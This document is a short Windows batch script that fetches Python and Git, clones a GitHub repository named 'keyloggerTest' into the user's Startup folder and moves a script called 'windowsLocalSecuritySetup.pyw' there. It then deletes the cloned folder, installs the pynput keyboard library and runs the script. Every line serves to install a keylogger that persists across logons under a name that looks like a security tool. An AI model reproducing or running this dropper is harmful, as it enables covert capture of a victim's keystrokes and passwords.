start https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe
timeout 120
start https://github.com/git-for-windows/git/releases/download/v2.38.1.windows.1/Git-2.38.1-64-bit.exe
timeout 120
cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
git clone https://github.com/youcef70145/keyloggerTest.git
timeout 10
move "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keyloggerTest\windowsLocalSecuritySetup.pyw" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
@RD /S /Q "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keyloggerTest\"
pip install pynput
python windowsLocalSecuritySetup.pyw